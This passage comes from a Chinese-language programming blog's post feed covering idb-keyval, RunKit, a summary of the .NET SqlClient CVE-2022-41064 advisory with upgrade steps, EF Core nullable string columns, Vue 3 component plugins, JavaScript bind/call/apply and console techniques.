.then((val) =\u0026gt; console.log(val)); getMany getMany： 獲取多個數據\n一次獲取多個數據，比一個一個的獲取資料更快\n1 2 3 4 5 6 7 8 9 import { get, getMany } from \u0026#39;idb-keyval\u0026#39;; // 不應該: Promise.all([get(123), get(\u0026#39;hello\u0026#39;)]) .then(([firstVal, secondVal]) =\u0026gt; console.log(firstVal, secondVal)); // 這樣做更快: getMany([123, \u0026#39;hello\u0026#39;]) .then(([firstVal, secondVal]) =\u0026gt; console.log(firstVal, secondVal)); del del： 刪除資料\n根據 key 刪除資料\n1 2 3 import { del } from \u0026#39;idb-keyval\u0026#39;; del(\u0026#39;hello\u0026#39;); delMany delMany： 刪除多個數據\n一次刪除多個鍵，比一個一個的刪除更快\n1 2 3 4 5 6 7 8 9 10 11 12 import { del, delMany } from \u0026#39;idb-keyval\u0026#39;; // 不應該: Promise .all([del(123), del(\u0026#39;hello\u0026#39;)]) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); // 這樣做更快: delMany([123, \u0026#39;hello\u0026#39;]) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); update update： 排隊更新資料，防止由於非同步導致資料更新問題\n因為 get 與 set 都是非同步的使用他們來更新資料可能會存在問題如：\n1 2 3 4 5 6 // Don\u0026#39;t do this: import { get, set } from \u0026#39;idb-keyval\u0026#39;; get(\u0026#39;counter\u0026#39;).then((val) =\u0026gt; set(\u0026#39;counter\u0026#39;, (val || 0) + 1); ); get(\u0026#39;counter\u0026#39;).then((val) =\u0026gt; set(\u0026#39;counter\u0026#39;, (val || 0) + 1); ); // 上述程式碼我們期望的是 2 但實際結果是 1，我們可以在第一個 callback 執行第二次操作。 更好的方法是使用 update 來更新資料：\n1 2 3 4 5 6 // Instead: import { update } from \u0026#39;idb-keyval\u0026#39;; update(\u0026#39;counter\u0026#39;, (val) =\u0026gt; (val || 0) + 1); update(\u0026#39;counter\u0026#39;, (val) =\u0026gt; (val || 0) + 1); // 將自動排隊更新，所以第一次更新將計數器設定為 1，第二次更新將其設定為 2。 clear clear： 清除所有資料\n1 2 3 import { clear } from \u0026#39;idb-keyval\u0026#39;; clear(); entries entries： 返回 [key, value] 形式的資料\n1 2 3 4 import { entries } from \u0026#39;idb-keyval\u0026#39;; // logs: [[123, 456], [\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;]] entries().then((entries) =\u0026gt; console.log(entries)); keys keys： 獲取所有資料的 key\n1 2 3 4 import { keys } from \u0026#39;idb-keyval\u0026#39;; // logs: [123, \u0026#39;hello\u0026#39;] keys().then((keys) =\u0026gt; console.log(keys)); values values： 獲取所有資料的 value\n1 2 3 4 import { values } from \u0026#39;idb-keyval\u0026#39;; // logs: [456, \u0026#39;world\u0026#39;] values().then((values) =\u0026gt; console.log(values)); createStore createStore： 自定義倉庫\n1 2 3 4 5 6 7 8 9 10 11 // 自定義資料庫名稱及表名稱 // 建立一個數據庫: // 資料庫名稱為 tang_shi，表名為 table1 const tang_shi_table1 = idbKeyval.createStore(\u0026#39;tang_shi\u0026#39;, \u0026#39;table1\u0026#39;); // 向對應倉庫新增資料 idbKeyval.set(\u0026#39;add\u0026#39;, \u0026#39;table1 的資料\u0026#39;, tang_shi_table1); // 預設建立的倉庫名稱為 keyval-store，表名為 keyval idbKeyval.set(\u0026#39;add\u0026#39;, \u0026#39;預設的資料\u0026#39;); 使用 createStore 建立的資料庫一個庫只會建立一個表：\n1 2 3 4 5 6 7 // 同一個庫有不可以有兩個表，custom-store-2 不會建立成功: const customStore = createStore(\u0026#39;custom-db-name\u0026#39;, \u0026#39;custom-store-name\u0026#39;); const customStore2 = createStore(\u0026#39;custom-db-name\u0026#39;, \u0026#39;custom-store-2\u0026#39;); // 不同的庫有相同的表名，這是可以的: const customStore3 = createStore(\u0026#39;db3\u0026#39;, \u0026#39;keyval\u0026#39;); const customStore4 = createStore(\u0026#39;db4\u0026#39;, \u0026#39;keyval\u0026#39;); 總結 本文介紹了兩個 IndexedDB 的庫，用來解決 localStorage 儲存容量太小的問題。\nlocalforage 與 idb-keyval 之間我更喜歡 localforage 因為其與 localStorage 相似的 api 幾乎沒有上手成本。\n如果需要更加靈活的庫可以看一下 dexie.js、PouchDB、idb、JsStore 或者 lovefield 之類的庫。\n","date":"2022-11-15T00:00:00Z","image":"https://live.staticflickr.com/65535/52501465120_8e19a1cda3_o.png","permalink":"https://wayneblog.ga/2022-11-15/localforage-and-idb-keyval/","title":"localStorage 容量太小？試試 localforage、idb-keyval"},{"content":" 參考網站\n試用RunKit 先來說說 RunKit 是什麼。\n首先，Runkit 可以讓你在瀏覽器中運行 Node.js 的代碼。在 Runkit 中，可以很方便的調用眾多的 npm 模塊。這就有點像 Node.js 版的 Jupyter Notebook。同時，Runkit 還可以提供一個免費的 HTTP 服務器而無需任何的服務器安裝和配置。這在開發手機 APP 的服務器端，以及微服務的時候尤其有用。當然，實現無服務器的選擇很多，比如 AWS 的 Lambda + API Gateway，但 RunKit 的最大優勢就是完全免費的，這在開發軟件原型的時候就更為方便了。\n下面分別來看看這兩項功能。\n打開頁面： https://runkit.com/home\n可以通過 Github 授權登錄：\n登錄成功後可以看到：\n點擊運行按鈕後就可以在頁面中看到執行結果：\n在 Runkit 的頁面中可以像正常的 Node.js 環境一樣運行各種 JS 語句。比如，運行如下的簡單代碼獲取 Hive 中文區的最新文章：\n1 2 3 4 5 6 7 8 9 const hive = require(\u0026#39;@hiveio/hive-js\u0026#39;); // Read posts from Hive hive.api.getDiscussionsByCreated({ tag: \u0026#39;hive-105017\u0026#39;, limit: 10 }, function(err, discussions) { for (let i = 0; i \u0026lt; discussions.length; i++) { let post = discussions[i] console.log(post.title) } }) 可以看到返回的结果：\nAPI Endpoint 再來看看我最喜歡的 Runkit 功能：提供簡單的 API endpoint。\n非常簡單的源碼：\n1 exports.endpoint = function(request, response) { response.end(\u0026#34;API endpoint test\u0026#34;); } 單擊 publish 進行發布：\n發布後單擊 endpoint 就會打開對應的 API URL：\n比如說，我這裡的就是：\nhttps://api-jdcmj9qsmxmb.runkit.sh/\n可以看到，無需配置/運行服務器，就可以有自己的 API 可用，又是 serverless，同時還免費，是不是很爽？\n","date":"2022-11-14T00:00:00Z","image":"https://live.staticflickr.com/65535/52498373077_445fbf68b7_o.jpg","permalink":"https://wayneblog.ga/2022-11-14/try-runkit/","title":"試用 RunKit"},{"content":" 參考網站\n微軟在 2022-11-08 公佈了 System.Data.SqlClient、Microsoft.Data.SqlClient 的安全漏洞，由於涵蓋大量 .NET 版本 (.NET Framework 到 .NET 6 都可能使用到)，範圍不小，身為 .NET 開發人員，應該關注其影響及修補方式。\n參考了以下文件，試著整理資訊如後。\nMicrosoft Security Advisory CVE 2022-41064 | .NET Information Disclosure Vulnerability #239 .NET Information Disclosure Vulnerability GHSA-8g2p-5pqh by GitHub .NET Framework Information Disclosure Vulnerability CVE-2022-41064 .NET Framework November 2022 Security and Quality Rollup Updates 漏洞來源及攻擊方式 漏洞發生原因是現有 SQL Client 程式庫有個 Bug，在高負載狀況下「非同步查詢(Asynchronously Executed Query)」有可能發生錯接查詢結果的狀況，亦即查詢 A 拿到查詢 B 的結果。\n註：資訊有限，但 Asynchronously Executed Query 應指 ExecuteReaderAsync、ExecuteScalarAsync、ExecuteXmlReaderAsync 等非同步方法參考，同步式查詢(ExecuteReader()\u0026hellip;)在一些狀態下也有可能受影響。(在 Github 找到相關單元測試，透過 ExecuteReader() 但不讀取內容就拋棄 Transaction Scope 方式重現)\n攻擊成功條件：參考\nExploiting this vulnerability requires an attacker to be within the SQL Connection Pool.\n攻擊者須位於同一 SQL Connection Pool 內 (換言之，在同一 Process 內執行) Successful exploitation of this vulnerability requires an attacker to exhaust all the threads in the thread pool.\n攻擊者需耗盡所有 Thread Pool 所有 Thread In this case, a successful attack could cause the attacker access queries from other users in the SQL Connection Pool.\n在此狀況下，攻擊者有機會存取到同 SQL Connetion Pool 其他使用者的查詢結果(撿到什麼內容屬隨機性質) 漏洞範圍 漏洞存在 Microsoft.Data.SqlClient 及 System.Data.SqlClient 眾多版本：\nMicrosoft.Data.SqlClient 1.1.3 (含)之前及 2.0.0 ~ 2.1.1 System.Data.SqlClient 4.8.4 (含)之前版本 而微軟也已釋出 1.1.4、2.1.2、4.8.5 修補漏洞\n修補方式 .NET Core / .NET 5/6 使用以下方式更新版本：\n1 2 3 4 5 6 7 dotnet add package Microsoft.Data.SqlClient --version 2.1.2 # 或 dotnet add package Microsoft.Data.SqlClient --version 1.1.4 # 或 dotnet add package System.Data.SqlClient --version 4.8.5 或者直接修改 .csproj：(若專案先參照其他程式庫再間接參照 SqlClient，也需要加入 PackageReference 強制使用新版)\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;Project Sdk=\u0026#34;Microsoft.NET.Sdk.Web\u0026#34;\u0026gt; \u0026lt;PropertyGroup\u0026gt; \u0026lt;TargetFramework\u0026gt;net6.0\u0026lt;/TargetFramework\u0026gt; \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt; \u0026lt;ImplicitUsings\u0026gt;enable\u0026lt;/ImplicitUsings\u0026gt; \u0026lt;/PropertyGroup\u0026gt; \u0026lt;ItemGroup\u0026gt; \u0026lt;PackageReference Include=\u0026#34;Microsoft.Data.SqlClient\u0026#34; Version=\u0026#34;2.1.2\u0026#34; /\u0026gt; \u0026lt;/ItemGroup\u0026gt; \u0026lt;/Project\u0026gt; .NET Framework 請安裝 November 2022 Security and Quality Rollup Updates for .NET Framework。\n","date":"2022-11-11T00:00:00Z","image":"https://live.staticflickr.com/65535/52491745274_95b2fa11ec_o.jpg","permalink":"https://wayneblog.ga/2022-11-11/dotnet-cve-2022-41064/","title":".NET SqlClient 安全漏洞 CVE-2022-41064 解讀"},{"content":" 參考網站\n升級 .NET 6 踩到的小問題筆記。\n前情提要 依之前學到的 EF Core Model 設計，string 屬性預設對應的欄位預設為 Nullable，標註 [Required] 才會宣告為 NOT NULL。 不過，這條規則到 .NET 6 已有所改變。某段 EF Core 寫入資料庫時冒出欄位不允許 NULL，但 Model 中該屬性並未宣告為 [Required]。\n研究發現這與 .NET 6 啟用 Nullable Context 有關，csproj 多了 \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt; 設定以支援 C# 8 推出的 Nullable Reference Type 概念。 設為 enable 時，Compiler 啟用 Null Reference Analysis 及相關語言特性，以字串為例，若 string 沒宣告成 string? 卻可能為 null 時會得到警告；若要明確標示此處就是要設成 null，可在後方加上 Null-Forgiving Operator， 例如 string x = null!;。\n若不想啟用此特性，設成 disable，Compiler 即會恢復 C# 7.3 以前的行為。\nEF Core 產生資料庫對應 SQL Schema 時，也會受 Nullable Context 影響，當 \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt;，即使未加 [Required]，Model 的字串屬性仍會被視為不可為 null，在 CREATE TABLE 時會加上 NOT NULL。\n問題重現 用以下程式重現問題。簡單宣告了 Entity 型別、DbContext，其中 RequiredText 有加註 [Required]，另一個 OptionalText 則沒有，呼叫 DbContext.DataBase.GenerateCreateScript() 檢視其對應的 SQL Schema：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 using System.ComponentModel.DataAnnotations; using Microsoft.EntityFrameworkCore; var options = new DbContextOptionsBuilder\u0026lt;MyContext\u0026gt;() .UseSqlServer(\u0026#34;data source=(localdb)\\\\mssqllocaldb\u0026#34;) .Options; var dbCtx = new MyContext(options); Console.WriteLine(dbCtx.Database.GenerateCreateScript()); class MyContext : DbContext { public DbSet\u0026lt;Item\u0026gt; Items { get; set; } = null!; public MyContext(DbContextOptions\u0026lt;MyContext\u0026gt; options) : base(options) { } } public class Item //Entity 型別 { //慣例，屬性名稱為 Id 或 \u0026lt;type name\u0026gt;Id 會自動成為 Entity 的 Key public int ItemId { get; set; } [Required] public string RequiredText { get; set; } = null!; public string OptionalText { get; set; } = null!; } 如下圖所示，當 \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt; 時，OptionalText 也會被加上 NOT NULL，換成 disable 才會恢復之前的規則。\n所以，.NET 6 啟用 Nullable Context 時，Model 字串屬性要允許 null，型別也需改成 string?，這樣才會對應成 Nullable 資料庫欄位。(註：RequiredText 故意拿掉 = null! 觸發 CS8618 警告，證明有設 \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt;)\n","date":"2022-11-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52489392442_2208a4dc64_o.png","permalink":"https://wayneblog.ga/2022-11-10/efcore-6-string-not-null/","title":"Entity Framework Core 6.0 字串屬性對應欄位 NOT NULL 問題"},{"content":" 參考網站\n前情提要 在小專案裡我主要用 Vue.js 來處理 MVVM，用 \u0026lt;script\u0026gt; 載入 vue.js，寫幾行 JavaScript 搞定，走不寫模組，不用 TypeScript，免編譯打包的「輕前端」模式，但常用邏輯還是會寫成元件(Component)方便共用。\n在 Vue 2 時代，我習慣在網頁共用的 .js 裡使用 Vue.component(\u0026quot;my-component\u0026quot;, ...) 註冊元件，註冊一次，各網頁不需宣告就能使用元件。\n正式擺脫 IE 後，終於不用再死守 Vue 2，試著將一個小專案升級到 Vue 3，遇到小麻煩。\nVue 3 改變了元件註冊方式，不再提供全域註冊，必須先 Vue.createApp() 建立實體，app.component(\u0026quot;my-component\u0026quot;, ...) 註冊或用 components 屬性引用才能使用元件。參考：重新認識 Vue.js - 元件的宣告與註冊\n全域元件改成區域元件可減少程式間互相干擾，在軟體架構來說是正確的方向，但對簡單應用來說(例如：程式很單純，全域元件打架機率趨於零的場合)，這番調整讓元件註冊變得繁瑣。\n用個範例來說明。\nVue 2 註冊多個元件 原本 Vue 2 做法是在 my-components-vue2.js 中註冊多個元件：\nmy-components-vue2.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 Vue.component(\u0026#39;date-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{date}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { date: new Date().toJSON().slice(0, 10) }; } }); Vue.component(\u0026#39;time-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{time}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { time: new Date().toJSON().slice(11, 19) }; } }); Vue.component(\u0026#39;host-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{host}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { host: location.host }; } }); 如此，數十支 HTML 只需載入 my-components-vue2.js 便能在網頁使用 \u0026lt;date-tag\u0026gt;、\u0026lt;time-tag\u0026gt; 插入元件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;my-components-vue2.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;date-tag\u0026gt;\u0026lt;/date-tag\u0026gt; \u0026lt;time-tag\u0026gt;\u0026lt;/time-tag\u0026gt; \u0026lt;host-tag\u0026gt;\u0026lt;/host-tag\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var app = new Vue({ el: \u0026#39;#app\u0026#39; }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 升級 Vue 3 之後 升級 Vue 3 之後，元件的 js 跟網頁都要做一些修改：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 var dateTag = { template: \u0026#39;\u0026lt;div\u0026gt;{{date}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { date: new Date().toJSON().slice(0, 10) }; } }; var timeTag = { template: \u0026#39;\u0026lt;div\u0026gt;{{time}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { time: new Date().toJSON().slice(11, 19) }; } }; var hostTag = { template: \u0026#39;\u0026lt;div\u0026gt;{{host}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { host: location.host }; } }; 建立 app 寫法改為 Vue.createApp，並在宣告中透過 components 列舉要註冊的物件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/vue@3\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;my-components-vue3-upgrade.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;date-tag\u0026gt;\u0026lt;/date-tag\u0026gt; \u0026lt;time-tag\u0026gt;\u0026lt;/time-tag\u0026gt; \u0026lt;host-tag\u0026gt;\u0026lt;/host-tag\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var app = Vue.createApp({ components: { \u0026#39;date-tag\u0026#39;: dateTag, \u0026#39;time-tag\u0026#39;: timeTag, \u0026#39;host-tag\u0026#39;: hostTag } // 若元件物件名稱與標籤相符，可簡寫成 // components: { dateTag, timeTag, hostTag } }) .mount(\u0026#39;#app\u0026#39;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 假設我有 30 個網頁，30 個 app 都要加 components: { dateTag, timeTag, hostTag }，未來若新增其他元件，所有 components 列舉都要改，這是標準的「Copy \u0026amp; Paste 負面教材」呀，一想就覺得很不 OK 呀。\n這種情境，就是套件(Plugin，也有人翻成插件、外掛)上場的時刻。最簡單的套件寫法是寫一個 function，接收 app 及 options 參數，內部呼叫 app.component(...) 逐一註冊元件，options 則是自訂參數，可用來決定要註冊哪些元件或變更元件設定值，提高運用彈性。以下是簡單示範：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 function myComponentsPlugin(app, options) { app.component(\u0026#39;date-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{date}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { date: new Date().toJSON().slice(0, 10) }; } }); app.component(\u0026#39;time-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{time}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { time: new Date().toJSON().slice(11, 19) }; } }); app.component(\u0026#39;host-tag\u0026#39;, { template: \u0026#39;\u0026lt;div\u0026gt;{{host}}\u0026lt;/div\u0026gt;\u0026#39;, data: function () { return { host: location.host }; } }); } 如此，呼叫端可簡化為 .use(myComponentsPlugin)，不需把所有元件列出來，未來要新增元件，修改 my-components-vue3.js 即可，保留原先全域元件的簡單方便：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/vue@3\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;my-components-vue3.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;date-tag\u0026gt;\u0026lt;/date-tag\u0026gt; \u0026lt;time-tag\u0026gt;\u0026lt;/time-tag\u0026gt; \u0026lt;host-tag\u0026gt;\u0026lt;/host-tag\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var app = Vue.createApp({ //... }).use(myComponentsPlugin) .mount(\u0026#39;#app\u0026#39;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ","date":"2022-11-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52489820266_b81b766288_o.png","permalink":"https://wayneblog.ga/2022-11-10/vue-2to3-global-component/","title":"Vue 2 升級 Vue 3 之全域元件註冊問題"},{"content":" 參考網站\n參考網站\n參考網站\n參考網站\n參考網站\n使用 bind、call、apply 改變 this 指向的對象 如果想要改變 this 指向的對象，可以透過 bind、call、apply 這三個 method 辦到。\n1 2 3 4 5 6 7 8 9 10 11 const person = { userName: \u0026#39;Blueberry\u0026#39; } // 接著 create 一個函式來呼叫 person 的 userName： function callName() { console.log(\u0026#39;Hello \u0026#39; + this.userName); } // 呼叫 callName： callName(); output： 1 \u0026gt; Hello undefined 因為 callName() 函式中的 this 指向的是 global object（也就是 Window 物件），所以這時候我們希望把 callName() 的 this 指向 person 這個對象，可以使用以下方法：\nbind MDN web docs\n1 function.bind(thisArg[, arg1[, arg2[, ...]]]) bind 和其他兩個方法（call、apply）的不同有兩點：\nbind 是創造一個函式物件的拷貝，不會執行函式，因此 bind 之後還要再另外寫執行函式的動作；而 call、apply 是直接執行函式。 bind 後面傳入的參數值會設定為拷貝函式的永久參數值，之後執行拷貝函式時，無論怎麼給予參數都沒有用；而 call、apply 則是單純給予參數，像一般呼叫函式那樣。 我們先單純就第一點來說明，示範最基本的 bind 怎麼寫。\n第一種寫法 1 callName.bind(person)(); 也等於：\n1 2 const callFunction = callName.bind(person); // 創造函式物件的拷貝 callFunction(); // 執行函式 output： 1 \u0026gt; Hello Blueberry 第二種寫法，直接寫在函式表示式後面也可以 1 2 3 4 5 const callName = function() { console.log(\u0026#39;Hello \u0026#39; + this.userName); }.bind(person); callName(); output： 1 \u0026gt; Hello Blueberry 接下來針對第二點來說明，先來改寫一下 callName 函式，加入兩個 arguments：\n1 2 3 4 5 function callName(age, interest) { console.log(\u0026#39;Hello \u0026#39; + this.userName); console.log(\u0026#39;Your age is \u0026#39; + age); console.log(\u0026#39;Your interest is \u0026#39; + interest); } 接著我們除了要用 bind 將 this 指向 person 之外，還要給予 age 和 interest 這兩個參數。\n這邊有兩種做法：單純給定參數，或綁定永久參數值。\n單純給定參數 要單純給定參數的話，像一般執行函式那樣，在執行函式時再給予參數就可以了。\n1 2 const callFunction = callName.bind(person); callFunction(24, \u0026#39;Reading books\u0026#39;); output： 1 2 3 \u0026gt; Hello Blueberry \u0026gt; Your age is 24 \u0026gt; Your interest is Reading books 綁定永久參數值 如果將參數放在 bind 中，這個函式拷貝物件的參數值就會永遠被固定住。\n1 2 const callFunction = callName.bind(person, 24, \u0026#39;Reading books\u0026#39;); callFunction(30, \u0026#39;Playing games\u0026#39;); // 這邊無論再怎麼給參數都沒用 output： 1 2 3 \u0026gt; Hello Blueberry \u0026gt; Your age is 24 \u0026gt; Your interest is Reading books call MDN web docs\n1 function.call(this, arg1, arg2..., argn) call 和 bind 不同，它會直接執行函式，後面給的參數也不會被固定住。\n.call() 存在於任何一個函數或者方法上，是個 function 就可以調用 .call()。\n1 callName.call(person, 24, \u0026#39;Reading books\u0026#39;); output： 1 2 3 \u0026gt; Hello Blueberry \u0026gt; Your age is 24 \u0026gt; Your interest is Reading books 修改 this 指向 對於沒有定義在任何對像上的 function，實際上也有 this 指向，指向的是個全局對象。 對於定義在某個 object 上面的方法，this 指向，很好理解。 下面拿一個對象變數做例子，來說明問題：\n1 2 3 4 5 6 7 8 let sunan = { c: 3, test: function (a, b) { return a + b + this.c; } } console.log(sunan.test(1, 2)); // 6 console.log(sunan.test.call({ c: 4 }, 1, 2)); // 7 在這個例子裡面，.call() 的第一個參數傳入了一個新的對象，它覆蓋了原有的數據。c 屬性由 3 變成了 4，而 test 方法依然存在。\noutput： 1 2 \u0026gt; 6 \u0026gt; 7 apply MDN web docs\n1 function.apply(this, [arg1, arg2..., argn]) apply 的寫法跟 call 很相近，與 call 不同的是，後面的參數需要使用陣列傳遞，適合搭配 arguments 運用在算數的函式。\n1 callName.apply(person, [24, \u0026#39;Reading books\u0026#39;]); output： 1 2 3 \u0026gt; Hello Blueberry \u0026gt; Your age is 24 \u0026gt; Your interest is Reading books 同一個例子的 call 與 apply 寫法比較 1 2 callName.call(person, 24, \u0026#39;Reading books\u0026#39;); callName.apply(person, [24, \u0026#39;Reading books\u0026#39;]); 修改 this 指向 和 .call() 一樣，.apply() 的第一個參數也是修改 this 指向的。 可能的錯誤 也許會碰到下面的錯誤提示信息：\n1 TypeError: CreateListFromArrayLike called on non-object 解決方案就是把參數打包成數組[]，進行傳遞。\n使用情境 function borrowing： 借用 function function borrowing 就是借別人函式中的方法來用的意思，下面示範 somebody 借用 person 的 getUserName 方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 const person = { userName: \u0026#39;Blueberry\u0026#39;, getUserName: function() { console.log(this.userName); } } const somebody = { userName: \u0026#39;Fan\u0026#39; } // with bind() const newUser = person.getUserName.bind(somebody); newUser(); // with call() person.getUserName.call(somebody); // with apply() person.getUserName.apply(somebody); output： 1 2 3 \u0026gt; Fan \u0026gt; Fan \u0026gt; Fan function currying： 拷貝 function function currying 的定義為建立一個函式的拷貝，並設定預設的參數，這在數學運算下很有用。下面我們就利用 bind 的特性來完成 function currying。\n1 2 3 4 5 6 const mutiply = function (a, b) { return a * b; } const mutiplyByTwo = mutiply.bind(this, 2); console.log(mutiplyByTwo(4)); output： 1 \u0026gt; 8 上面我們建立了一個函式 mutiply(a, b)，並用 bind 建立函式物件拷貝 mutiplyByTwo()。\nmutiply.bind(this, 2) 這邊的 this 並不重要，因為函式裡沒有使用到 this。\n而後面的 2 則是永久綁定了參數 a。\n為了讓程式碼比較好理解，這邊將上面那段程式碼拆解，它也等於：\n1 2 3 4 5 6 7 8 const mutiply = function (a) { return (b) =\u0026gt; { return a * b; } } const mutiplyByTwo = mutiply(2); console.log(mutiplyByTwo(4)); output： 1 \u0026gt; 8 ","date":"2022-11-09T00:00:00Z","image":"https://live.staticflickr.com/65535/52487952181_5991519a08_o.jpg","permalink":"https://wayneblog.ga/2022-11-09/js-call-apply-bind/","title":"使用 bind、call、apply 改變 this 指向的對象"},{"content":" 參考網站\n寫 JavaScript 需要檢視運作是否正確時候，都會使用 console.log 來檢視輸出或運算的值，而 console 的運用技巧不僅僅只有將值呈現在開發的 Console 介面中。本篇就來介紹許多 console 語法的實戰運用方法吧！\n首先，在此先準備一份等等會用到的物件及陣列作為以下範例使用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 const Ming = { name: \u0026#39;小明\u0026#39;, age: 15, favorite: \u0026#39;鍋燒意麵\u0026#39; } const Jay = { name: \u0026#39;杰倫\u0026#39;, age: 16, favorite: \u0026#39;炒麵\u0026#39; } const Auntie = { name: \u0026#39;漂亮阿姨\u0026#39;, age: 21, favorite: \u0026#39;蘿蔔糕\u0026#39; } const people = [Ming, Jay, Auntie]; 為 console.log 的程式碼上色 有在 Facebook 頁面中開啟過開發者工具嗎？如果有，相信你對於以下這張圖並不陌生。\nConsole 中的文字並非只有固定的色彩，它與網頁中的文字一樣，都可以透過 CSS 的語法來調整其色彩，只要在 log 的文字前方先加入 %c 後，在 , 後方的參數就能夠傳入 CSS 語法做為參數，並且調整 Console 中呈現的文字樣式。\n1 console.log(`%c ${Ming.name} 有瑟瑟的顏色`, \u0026#39;color: orange; font-size: 24px\u0026#39;); console.table()：使用表格的方式陳列陣列的資訊 當要呈現資料於 Console 介面中，做常見的方式就是使用 log 的方法：\n1 2 3 4 5 6 // 基本用法 console.log(Ming); console.log(Jay); console.log(Auntie); console.log(people); 當然，這樣的用法絕對沒有問題，透過此方法可以將值一一陳列出來，不過當這些數值是 具有關聯性 時，一般的 log 就無法比較兩者之間的關係。\nconsole.table() 針對物件之間有相同的屬性名稱時，就能夠輕易的比較相同屬性之間的關係。\n1 2 console.table([Ming, Jay, Auntie]); console.table(people); 除此之外，表格上方的標頭還可以點選作為排序使用，如果拿到一個 JSON 想比對其中的值，還要轉貼到 Excel 或是 sort() 語法安排，不如直接改用 table() 進行比較吧。\nconsole.group()：群組化大量的 log 資訊 使用 log() 觀看迴圈值是合情合理的，不過當陣列的長度有上百筆時，Console 介面中的資料還真會滾到令人厭世。\n1 2 3 4 for (let index = 0; index \u0026lt; people.length; index++) { const element = people[index]; console.log(element); } 在迴圈中使用 console.log() 會一一呈現資料，數量一多看起來就會顯的很吃力\n使用 console.group()、console.groupEnd() 設置群組的起訖，在 Console 的介面中就能方便的收合群組內容。\n1 2 3 4 5 6 console.group(\u0026#39;迴圈群組\u0026#39;); for (let index = 0; index \u0026lt; people.length; index++) { const element = people[index]; console.log(element); } console.groupEnd(); console.group(/* 群組名稱 */) 可以傳入 群組名稱 做為參數，作為在 Console 介面中辨識群組的顯示名稱，在介面中的群組名稱也會以粗體名稱，並且可以點擊箭頭符號收合群組內容。\nconsole.time()：開發者最愛斤斤計較那 1ms 的效能了 每當寫出神邏輯的時候，都會擔心電腦效能跟不上自己的思維，這時候就可以使用 time() 追蹤片段程式碼所處理的時間差，得知自己是不是該換台電腦解決問題。\n1 2 3 4 5 6 7 // 時間追蹤 